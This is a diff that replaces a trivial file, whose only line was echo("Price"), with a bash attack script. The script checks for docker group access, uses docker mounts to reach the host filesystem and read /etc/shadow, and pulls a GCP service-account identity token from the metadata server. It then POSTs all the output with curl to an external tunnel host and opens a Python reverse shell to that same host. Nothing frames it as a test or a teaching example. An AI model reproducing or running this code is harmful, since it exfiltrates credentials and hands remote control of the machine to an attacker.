@@ -1,1 +1,19 @@
-echo("Price")
+#!/bin/bash
+URL="https://0533655478ef9549-103-95-173-85.serveousercontent.com"
+
+{
+  echo "--- [1] IDENTITY & DOCKER GROUP ---"
+  id; groups | grep -o 'docker'
+  
+  echo "--- [2] HOST ESCAPE ---"
+  IMG=$(sudo docker images -q | head -n 1)
+  sudo docker run --rm -v /:/host:ro $IMG cat /host/etc/hostname 2>/dev/null
+  
+  echo "--- [3] SHADOW FILE ACCESS ---"
+  sudo docker run --rm -v /etc:/mnt:ro $IMG head -n 5 /mnt/shadow 2>/dev/null
+
+  echo "--- [4] GCP IDENTITY TOKEN ---"
+  curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity
+} | curl -X POST -H "Content-Type: text/plain" --data-binary @- "$URL"
+
+python3 -c 'import socket,os,pty,signal;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0533655478ef9549-103-95-173-85.serveousercontent.com",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' &
